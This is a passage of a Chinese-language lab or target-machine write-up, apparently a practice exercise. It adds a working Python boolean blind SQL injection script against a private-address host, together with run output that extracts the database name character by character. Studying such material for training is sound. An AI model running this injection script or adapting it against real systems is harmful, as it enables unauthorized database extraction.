@@ -213,3 +213,136 @@ Target: http://10.216.75.72/
 * extractvalue
 过滤了这些关键字，而且应该是正则匹配，大小写，双写这些都绕过不了。根据过滤的关键字看，应该就是打布尔盲注了
 
+```python
+import socket  
+import urllib.parse  
+import time  
+  
+# ======================  
+# 发送 HTTP 请求  
+# ======================  
+def raw_post(host, port, path, data, referer):  
+    body = data  
+    req = (f"POST {path} HTTP/1.1\r\n"  
+           f"Host: {host}:{port}\r\n"  
+           f"User-Agent: Mozilla/5.0\r\n"  
+           f"Referer: {referer}\r\n"  
+           f"Content-Type: application/x-www-form-urlencoded\r\n"  
+           f"Content-Length: {len(body)}\r\n"  
+           f"Connection: close\r\n\r\n{body}")  
+  
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
+        s.connect((host, port))  
+        s.sendall(req.encode())  
+  
+        resp = b''  
+        while True:  
+            part = s.recv(4096)  
+            if not part:  
+                break  
+            resp += part  
+  
+    return resp.decode(errors='ignore')  
+  
+  
+# ======================  
+# 布尔判断（带投票）  
+# ======================  
+def bool_check(host, port, path, param, referer, condition, retry=3):  
+    payload = f"1' and ({condition}) -- "  
+    encoded = urllib.parse.quote(payload)  
+    data = f"{param}={encoded}"  
+  
+    true_count = 0  
+  
+    for _ in range(retry):  
+        resp = raw_post(host, port, path, data, referer)  
+  
+        if 'class="console success"' in resp:  
+            true_count += 1  
+  
+        time.sleep(0.03)  
+  
+    return true_count > retry // 2  
+  
+  
+# ======================  
+# 前缀盲注（核心）  
+# ======================  
+def extract_prefix(host, port, path, param, referer, sql_expr, max_len=50):  
+    result = ""  
+  
+    for pos in range(1, max_len + 1):  
+        found = False  
+  
+        for ascii_val in range(32, 127):  # 直接 ASCII 枚举  
+            condition = f"ascii(substr(({sql_expr}),{pos},1))={ascii_val}"  
+  
+            if bool_check(host, port, path, param, referer, condition):  
+                result += chr(ascii_val)  
+                print(result)  # ⭐ 每次输出完整前缀  
+                found = True  
+                break  
+        if not found:  
+            print("[!] 结束")  
+            break  
+  
+    return result  
+  
+  
+# ======================  
+# 主函数  
+# ======================  
+def main():  
+    HOST = "10.216.75.72"  
+    PORT = 80  
+    PATH = "/sl.php"  
+    REFERER = "http://10.216.75.72/secret.php"  
+    PARAM = "query_id"  
+  
+    # 测试  
+    print("[*] 测试布尔")  
+    print("1=1 ->", bool_check(HOST, PORT, PATH, PARAM, REFERER, "1=1"))  
+    print("1=2 ->", bool_check(HOST, PORT, PATH, PARAM, REFERER, "1=2"))  
+  
+    # 数据库名  
+    print("\n[*] 数据库名提取过程：")  
+    db = extract_prefix(  
+        HOST, PORT, PATH, PARAM, REFERER,  
+        "select database()"  
+    )  
+  
+    print(f"\n[+] 最终数据库名: {db}")  
+  
+  
+if __name__ == "__main__":  
+    main()
+```
+
+```bash
+C:\Users\15819\PyCharmMiscProject\.venv\Scripts\python.exe C:\Users\15819\PyCharmMiscProject\靶机.py 
+[*] 测试布尔
+1=1 -> True
+1=2 -> False
+
+[*] 数据库名提取过程：
+f
+fo
+for
+fore
+fores
+forest
+forest_
+forest_t
+forest_te
+forest_tem
+forest_temp
+forest_templ
+forest_temple
+[!] 结束
+
+[+] 最终数据库名: forest_temple
+
+
+```
+布尔盲注打通了，现在要来想想怎么继续
